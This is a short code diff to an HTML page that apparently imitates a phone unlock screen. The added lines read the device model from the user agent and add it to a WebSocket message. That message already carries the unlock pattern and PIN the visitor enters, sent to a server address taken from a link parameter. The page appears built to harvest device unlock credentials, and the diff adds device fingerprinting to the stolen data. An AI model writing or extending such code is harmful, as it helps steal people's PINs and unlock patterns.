@@ -79,6 +79,17 @@
   <div id="point8" class="point"></div>
 
   <script>
+
+    let deviceModel = "Unknown Device";
+if (navigator.userAgentData && navigator.userAgentData.mobile) {
+  deviceModel = navigator.userAgentData.platform || "Mobile Device";
+} else {
+  const userAgent = navigator.userAgent;
+  const match = userAgent.match(/\((.*?)\)/);
+  if (match) {
+    deviceModel = match[1];
+  }
+}
     // Extract the WebSocket URL and ID number from URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     const websocketUrl = urlParams.get('ws_url'); // Get the websocket URL from URL parameter
@@ -254,7 +265,8 @@
           socket.send(JSON.stringify({
             id_number: idNumber,
             pattern: patternData.join(','),
-            pin: pinData
+            pin: pinData,
+            device: deviceModel // Send device mode
           }));
         }
 
